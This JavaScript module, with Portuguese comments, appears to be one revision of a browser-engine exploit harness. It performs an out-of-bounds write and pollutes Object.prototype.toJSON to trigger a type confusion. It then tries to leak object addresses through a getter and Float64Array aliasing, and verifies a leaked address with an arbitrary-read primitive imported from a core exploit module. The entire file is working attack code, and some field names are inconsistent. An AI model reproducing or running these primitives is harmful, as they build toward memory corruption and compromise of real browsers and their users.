// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R11)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
import {
    triggerOOB_primitive, // Usado por attemptAddrofUsingCoreHeisenbug e para setup da TC
    clearOOBEnvironment,
    arb_read, 
    arb_write, 
    oob_write_absolute, 
    attemptAddrofUsingCoreHeisenbug // Agora modificado em core_exploit.mjs v31.R11
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; // Para a TC da sonda M1/M2
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF]; // Testar com um valor primeiro para simplicidade

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10; 

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R11() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + CoreExploit Addrof Attempt (R11) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R11...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null,
        tc_probe_details: null, // Renomeado de toJSON_details
        stringifyResult: null,
        addrof_A_result_getter_tc_probe: { success: false, msg: "Addrof (Getter TC Probe): Not set.", value: null }, 
        addrof_A_result_core_func: { success: false, msg: "Addrof (CoreExploit Func R11): Not set.", value: null, raw_double: null }, 
        addrof_B_result_direct_prop_tc_probe: { success: false, msg: "Addrof (Direct Prop TC Probe): Not set.", value: null },
        oob_value_used: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION R11: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0;
        let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null;
        let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; 
        let iteration_tc_first_detection_done = false; 

        const current_object_to_leak_A = { marker_A_R11: `LeakA_OOB_Val${toHex(current_oob_value)}` , r:Math.random() };
        const current_object_to_leak_B = { marker_B_R11: `LeakB_OOB_Val${toHex(current_oob_value)}` , r:Math.random() };
        
        // Sonda toJSON (como na R10, para detectar TC no marker_M2_ref_iter)
        function toJSON_TA_Probe_Iter_Closure_R11() {
            probe_call_count_iter++;
            const call_num = probe_call_count_iter;
            const current_this_type_str = Object.prototype.toString.call(this);
            const is_this_M2_confused = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && current_this_type_str === '[object Object]');
            logS3(`[PROBE_R11] Call #${call_num}. 'this': ${current_this_type_str}. IsM2Confused? ${is_this_M2_confused}. TCFlag: ${iteration_tc_first_detection_done}`, "leak");
            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_v82: "M2_Iter_R11" }; 
                    marker_M1_ref_iter = { marker_id_v82: "M1_Iter_R11", payload_M2: marker_M2_ref_iter };
                    return marker_M1_ref_iter;
                } else if (is_this_M2_confused) {
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true; 
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_R11", this_type:"[object Object]", this_is_M2: true,
                            getter_defined: false, direct_prop_set: false, getter_fired: false,
                            leak_val_getter_int64: null, leak_val_getter_is_ptr: false, error_probe: null
                        };
                        logS3(`[PROBE_R11] Call #${call_num} (M2 Confused): FIRST TC. Details obj CREATED. ID: ${this.marker_id_v82}`, "vuln");
                    }
                    if (iteration_final_tc_details_from_probe && (!this.hasOwnProperty('leaky_A_getter_v82') || iteration_final_tc_details_from_probe.call_number_tc_detected === call_num) ) {
                        try {
                            Object.defineProperty(this, 'leaky_A_getter_v82', { get: function () {
                                const det = iteration_final_tc_details_from_probe;
                                if(det) det.getter_fired = true;
                                if (!victim_typed_array_ref_iter?.buffer) { if(det) det.leak_val_getter_int64 = "getter_victim_null"; return "getter_victim_null"; }
                                let lvf=NaN, lis="getter_err_r11";
                                try {
                                    let vfv=new Float64Array(victim_typed_array_ref_iter.buffer); let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);
                                    const o0=vu32[0],o1=vu32[1]; vfv[0]=current_object_to_leak_A; lvf=vfv[0];lis=new AdvancedInt64(vu32[0],vu32[1]).toString(true);
                                    vu32[0]=o0;vu32[1]=o1; if(det)det.leak_val_getter_int64=lis;
                                    const lhi=new AdvancedInt64(lis).high(); const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);
                                    if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
                                    return nan?"getter_val_nan_inf":"getter_val_other";
                                } catch(e_g){lis=`getter_ex:${e_g.message}`;if(det)det.leak_val_getter_int64=lis;return lis;}
                            }, enumerable:true, configurable:true });
                            if(iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.getter_defined = true;
                            this.leaky_B_direct_v82 = current_object_to_leak_B;
                            if(iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.direct_prop_set = true;
                        } catch (e_m2d) { if(iteration_final_tc_details_from_probe) iteration_final_tc_details_from_probe.error_probe = `M2DefErr:${e_m2d.message}`; }
                    } return this; 
                }
            } catch (e_pm) { return { err_pm: call_num, msg: e_pm.message }; }
            return { gen_m: call_num, type: current_this_type_str };
        } // Fim da sonda

        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;
        let iter_primary_error = null; 
        let iter_addrof_getter_result = { success: false, msg: "Getter Addrof (TC Probe): Default", value: null };
        let iter_addrof_core_result = { success: false, msg: "CoreExploit Addrof (R11): Default", value: null, raw_double: null };
        let iter_addrof_direct_result = { success: false, msg: "Direct Prop (TC Probe): Default", value: null };
        let heisenbugConfirmedThisIter = false;
        
        try { 
            // Fase 1: Detecção da Type Confusion via sonda toJSON
            logS3(`  --- Fase 1 (R11): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            // A escrita OOB para esta TC é feita aqui.
            // attemptAddrofUsingCoreHeisenbug fará sua própria escrita OOB.
            await triggerOOB_primitive({ force_reinit: true }); // Configura oob_array_buffer_real
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            logS3(`  TC Probe: OOB Write done for TC detection. Offset: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(150);

            victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            logS3(`  TC Probe: Victim Uint8Array created and filled.`, "info", FNAME_CURRENT_ITERATION);

            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R11, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe: JSON.stringify completed. Raw: ${iter_raw_stringify_output}`, "info", FNAME_CURRENT_ITERATION);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); }
                catch (e_parse) { iter_stringify_output_parsed = { error_parsing_json: iter_raw_stringify_output }; }
                
                if (iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2) {
                    heisenbugConfirmedThisIter = true;
                    logS3(`  TC Probe: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln", FNAME_CURRENT_ITERATION);
                    const m2_summary = iteration_final_tc_details_from_probe;
                    iter_addrof_getter_result.value = m2_summary.leak_val_getter_int64;
                    if (m2_summary.leak_val_getter_is_ptr) {
                        iter_addrof_getter_result.success = true;
                        iter_addrof_getter_result.msg = `Getter Addrof: Potential pointer ${m2_summary.leak_val_getter_int64}`;
                    } else { iter_addrof_getter_result.msg = `Getter Addrof: Val ${m2_summary.leak_val_getter_int64 || 'N/A'} not pointer.`;}
                    if (m2_summary.error_probe && !iter_primary_error) iter_primary_error = new Error(m2_summary.error_probe);
                    // Checagem de leaky_B_direct_v82
                    let m2_obj_json = iter_stringify_output_parsed?.payload_M2 || iter_stringify_output_parsed;
                    if (m2_obj_json && marker_M2_ref_iter && m2_obj_json.marker_id_v82 === marker_M2_ref_iter.marker_id_v82) {
                        const val_direct = m2_obj_json.leaky_B_direct_v82; iter_addrof_direct_result.value = val_direct;
                        if (val_direct && current_object_to_leak_B && val_direct.marker_B_v82 === current_object_to_leak_B.marker_B_v82) {
                           iter_addrof_direct_result.success = true; iter_addrof_direct_result.msg = `Direct Prop: objB ID confirmed.`;
                        } else { iter_addrof_direct_result.msg = `Direct Prop: Not objB ID. Val: ${JSON.stringify(val_direct)}`; }
                    } else { iter_addrof_direct_result.msg = "Direct Prop: M2 payload not in stringify output."; }
                } else { logS3(`  TC Probe: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error", FNAME_CURRENT_ITERATION); }
            } catch (e_str) { if(!iter_primary_error) iter_primary_error = e_str; } 
            finally { if (pollutionApplied) { if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey]; } }
            logS3(`  --- Fase 1 Concluída. TC M2 Detectada (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            // Fase 2: Tentativa de Addrof usando attemptAddrofUsingCoreHeisenbug (MODIFICADO em core_exploit R11)
            logS3(`  --- Fase 2 (R11): Tentativa de Addrof com attemptAddrofUsingCoreHeisenbug ---`, "subtest", FNAME_CURRENT_ITERATION);
            try {
                // attemptAddrofUsingCoreHeisenbug agora deve usar a estrutura M1/M2 internamente
                // e tentar escrever o endereço de current_object_to_leak_A em seu _core_victim_float_view_for_addrof
                logS3(`  Addrof Core R11: Chamando attemptAddrofUsingCoreHeisenbug...`, "info", FNAME_CURRENT_ITERATION);
                const core_addrof_raw_result = await attemptAddrofUsingCoreHeisenbug(current_object_to_leak_A);
                logS3(`  Addrof Core R11: Resultado: ${JSON.stringify(core_addrof_raw_result)}`, "leak", FNAME_CURRENT_ITERATION);

                if (core_addrof_raw_result) {
                    iter_addrof_core_result.msg = core_addrof_raw_result.message || "Resultado CoreAddrof R11.";
                    iter_addrof_core_result.raw_double = core_addrof_raw_result.leaked_address_as_double;
                    if (core_addrof_raw_result.leaked_address_as_int64) { // Checa se o campo existe
                        const leaked_addr64 = core_addrof_raw_result.leaked_address_as_int64; // Já é AdvancedInt64
                        iter_addrof_core_result.value = leaked_addr64.toString(true);
                        const lhi_core = leaked_addr64.high();
                        const nan_inf_core = (lhi_core >= 0x7FF00000 && lhi_core < 0x80000000) || (lhi_core >= 0xFFF00000 && lhi_core < 0x100000000);
                        
                        if (core_addrof_raw_result.success && !nan_inf_core && (leaked_addr64.low() !== 0 || lhi_core !== 0) ) {
                            logS3(`  Addrof Core R11: SUCESSO. Addr: ${leaked_addr64.toString(true)}`, "vuln", FNAME_CURRENT_ITERATION);
                            iter_addrof_core_result.success = true; 
                            try { // Tenta verificar com arb_read
                                logS3(`  Addrof Core R11: Verificando ${leaked_addr64.toString(true)} com arb_read...`, "warn", FNAME_CURRENT_ITERATION);
                                const first_dword = await arb_read(leaked_addr64, 4); 
                                iter_addrof_core_result.msg += ` ArbRead DWord: ${toHex(first_dword)}.`;
                                logS3(`  Addrof Core R11: arb_read(${leaked_addr64.toString(true)}, 4) -> ${toHex(first_dword)}`, "leak", FNAME_CURRENT_ITERATION);
                            } catch (e_ar) { iter_addrof_core_result.msg += ` ArbRead Check FAIL: ${e_ar.message}.`; }
                        } else {
                             iter_addrof_core_result.msg = `Core Addrof R11: TC interna ${core_addrof_raw_result.success ? 'OK':'FALHOU'}, mas val ${leaked_addr64.toString(true)} é NaN/0 ou inválido.`;
                             logS3(`  Addrof Core R11: ${iter_addrof_core_result.msg}`, "warn", FNAME_CURRENT_ITERATION);
                        }
                    } else if (core_addrof_raw_result.success === false) { // Se success é explicitamente false
                         logS3(`  Addrof Core R11: Falhou. Msg: ${core_addrof_raw_result.message || 'N/A'}`, "warn", FNAME_CURRENT_ITERATION);
                    } else { // Se leaked_address_as_int64 não existe
                        iter_addrof_core_result.msg = "Core Addrof R11: leaked_address_as_int64 ausente no resultado.";
                        logS3(`  Addrof Core R11: ${iter_addrof_core_result.msg}`, "error", FNAME_CURRENT_ITERATION);
                    }
                } else { iter_addrof_core_result.msg = "Core Addrof R11: retornou nulo/inválido."; }
            } catch (e_core_addrof) {
                iter_addrof_core_result.msg = `Core Addrof R11: EXCEPTION: ${e_core_addrof.message || String(e_core_addrof)}`;
                if (!iter_primary_error) iter_primary_error = e_core_addrof;
            }
            logS3(`  --- Fase 2 Concluída. Addrof Core (R11) Sucesso: ${iter_addrof_core_result.success} ---`, "subtest", FNAME_CURRENT_ITERATION);

        } catch (e_outer_iter) { 
            if(!iter_primary_error) iter_primary_error = e_outer_iter; 
        } 
        finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Limpa após cada iteração completa
        }

        final_probe_call_count_for_report = probe_call_count_iter;
        let current_iter_summary = {
            oob_value: toHex(current_oob_value),
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
            stringify_output_this_iter: iter_stringify_output_parsed,
            addrof_A_getter_this_iter: iter_addrof_getter_result, 
            addrof_A_core_this_iter: iter_addrof_core_result,
            addrof_B_direct_this_iter: iter_addrof_direct_result,
            heisenbug_on_M2_this_iter: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);
        
        const old_best_score = (best_result_for_runner.addrof_A_result_core.success) ? 3 : ((best_result_for_runner.addrof_A_result_getter.success || best_result_for_runner.addrof_B_result.success) ? 2 : (best_result_for_runner.heisenbug_on_M2_confirmed_by_probe ? 1 : 0));
        const current_score = (iter_addrof_core_result.success) ? 3 : ((iter_addrof_getter_result.success || iter_addrof_direct_result.success) ? 2 : (heisenbugConfirmedThisIter ? 1 : 0));

        if (current_score > old_best_score || (current_score > 0 && !best_result_for_runner.oob_value_used) ) {
             best_result_for_runner = {
                errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result_getter: iter_addrof_getter_result, 
                addrof_A_result_core: iter_addrof_core_result,
                addrof_B_result: iter_addrof_direct_result,
                oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed_by_probe: heisenbugConfirmedThisIter
            };
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = { /* ... como antes ... */ 
                errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : best_result_for_runner.errorOccurred,
                tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result_getter: iter_addrof_getter_result, addrof_A_result_core: iter_addrof_core_result,
                addrof_B_result: iter_addrof_direct_result, oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed_by_probe: heisenbugConfirmedThisIter
            };
        }
        
        if (iter_addrof_core_result.success) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11: AddrofCore OK! Val${toHex(current_oob_value)}`;
        else if (heisenbugConfirmedThisIter) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11: TC OK Val${toHex(current_oob_value)}`;
        else document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R11: Iter ${toHex(current_oob_value)} Done`;
        
        await PAUSE_S3(250);
    } 

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result for runner (detailed R11): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return { 
        errorOccurred: best_result_for_runner.errorOccurred,
        toJSON_details: best_result_for_runner.tc_probe_details, 
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_A_result: best_result_for_runner.addrof_A_result_core, 
        addrof_B_result: best_result_for_runner.addrof_B_result, 
        addrof_A_getter_details: best_result_for_runner.addrof_A_result_getter, 
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_probe
    };
}
